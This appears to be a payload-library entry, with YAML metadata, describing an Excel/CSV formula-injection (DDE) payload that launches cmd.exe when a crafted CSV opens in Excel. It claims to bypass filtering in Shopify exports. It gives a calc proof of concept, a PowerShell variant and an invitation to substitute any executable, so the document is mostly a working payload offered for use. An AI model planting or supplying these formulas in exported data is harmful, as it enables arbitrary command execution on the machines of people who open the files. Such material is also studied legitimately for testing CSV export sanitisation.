---
id: 550e8400-e29b-41d4-a716-446655440004
data: '=cmd|'' /C calc''!''D2'''
tags:
  - formula-injection
  - rce
type: command
output: Opens Windows Calculator (calc.exe)
executor: excel
platforms:
  - Windows
created_at: '2024-01-01T00:00:00Z'
updated_at: '2025-12-14T17:28:44.260Z'
verified: false
validated: true
submitted: true
---
---

# excel-formula-injection-cmd

## Command

```excel
=cmd|' /C calc'!'D2'
```

## Description

This Excel formula injection payload executes an arbitrary Windows command by invoking cmd.exe when interpreted by Excel in a CSV cell. It bypasses partial filtering in Shopify exports by using quotes and exclamation marks to obscure the syntax.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `/C` | Executes the command string and then terminates | Yes |
| `calc` | The command to run (Windows Calculator); replace with any executable like `notepad` or `powershell` | Yes |
| `'!'D2'` | Obfuscation to evade filtering; references a cell to form valid formula | Yes |

## Examples

### Basic Usage

```excel
=cmd|' /C calc'!'D2'
```

### Advanced Usage

```excel
=cmd|' /C powershell -c Get-Process'!'D2'
```

> Runs PowerShell to list processes instead of calc.

## Expected Output

The formula triggers cmd.exe to execute the specified command. For `calc`, the Windows Calculator application launches immediately upon CSV opening in Excel. No console output; visual confirmation via app launch.

## Related

- [[Related Procedure: Export-Order-CSV-and-Execute-Formula]]

---
